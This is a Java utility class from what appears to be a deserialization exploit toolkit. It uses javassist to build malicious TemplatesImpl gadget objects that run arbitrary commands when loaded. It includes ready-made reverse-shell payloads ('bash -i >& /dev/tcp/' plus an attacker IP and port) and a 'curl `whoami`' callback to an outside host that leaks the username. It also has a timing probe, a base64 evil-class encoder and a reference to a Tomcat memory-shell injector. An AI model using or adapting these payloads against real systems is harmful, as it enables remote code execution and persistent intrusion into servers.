package util;

import com.fasterxml.jackson.databind.ser.Serializers;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import gadget.memshell.TomcatShellInject2;
import javassist.*;

import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.HashMap;

import static util.ReflectionUtils.setFieldValue;

public class GadgetUtils {

    public static TemplatesImpl createTemplatesImpl(String cmd)throws CannotCompileException, NotFoundException, IOException, InstantiationException, IllegalAccessException, NoSuchFieldException{
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("SOTA");
        //本机测试
        if(cmd.contains("calc")){
            cc.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\"calc\");");
        }else {
            cc.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec("+cmd+");");
        }
//        System.out.println("java.lang.Runtime.getRuntime().exec("+cmd+");");
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        cc.writeFile();
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};

        //补充实例化新建类所需的条件
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        ReflectionUtils.setFieldValue(templates, "_bytecodes", targetByteCodes);
        ReflectionUtils.setFieldValue(templates, "_name", "Squirtle");
        setFieldValue(templates,"_class",null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }

    public static TemplatesImpl createTemplatesImpl(Class clz)throws CannotCompileException, NotFoundException, IOException, InstantiationException, IllegalAccessException, NoSuchFieldException{
        ClassPool pool = ClassPool.getDefault();

        //获取一个Student类的CtClass对象
        CtClass ctClass = pool.get(clz.getName());
        byte[][] targetByteCodes = new byte[][]{ctClass.toBytecode()};

        //补充实例化新建类所需的条件
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        ReflectionUtils.setFieldValue(templates, "_bytecodes", targetByteCodes);
        ReflectionUtils.setFieldValue(templates, "_name", "Squirt1e");
        setFieldValue(templates,"_class",null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }

    public static Class makeClass(String clazzName) throws Exception{
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(clazzName);
        Class clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }

    //whoami
    public static TemplatesImpl getTemplatesImplReverseShell(String ip,String port) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {

        String cmd = "new String[]{\"/bin/sh\",\"-c\",\"sh -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\"}";
        return createTemplatesImpl(cmd);
    }
    //定制命令
    public static TemplatesImpl getTemplatesImpl(String cmd) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
        String cm = "new String[]{\"/bin/bash\",\"-c\",\""+cmd+"\"}";
        return createTemplatesImpl(cm);
    }
    public static TemplatesImpl getTemplatesImplReverseBashShell(String ip,String port) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
        String command = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1";
        String cmd = "new String[]{\"/bin/bash\",\"-c\",\""+command+"\"}";
        System.out.println(cmd);
        return createTemplatesImpl(cmd);
    }

    public static TemplatesImpl templatesImplLocalWindows(String command) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
//        String cm = "\"calc\"";
        String cm = "\""+command+"\"";
        return createTemplatesImpl(cm);
    }
    public static TemplatesImpl curlCommandResult() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
        String cmd = "\"curl `whoami`.gufd.callback.red\"";
        return createTemplatesImpl(cmd);
    }


    //延时检测，不执行命令
    public static TemplatesImpl getDelayTemplatesImpl() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
        String cmd = "\"Thread.currentThread().sleep(10000L);\"";
        return createTemplatesImpl(cmd);
    }

    public static String getEvilClassBase64(Class clz) throws IOException, CannotCompileException, NotFoundException {
        ClassPool pool = ClassPool.getDefault();

        CtClass ctClass = pool.get(clz.getName());
        byte[] targetByteCodes = ctClass.toBytecode();
        return Base64.getEncoder().encodeToString(targetByteCodes);
    }

    public static HashMap makeMap (Object v1, Object v2 ) throws Exception{
        HashMap s = new HashMap();
        ReflectionUtils.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        ReflectionUtils.setFieldValue(s, "table", tbl);
        return s;
    }
}
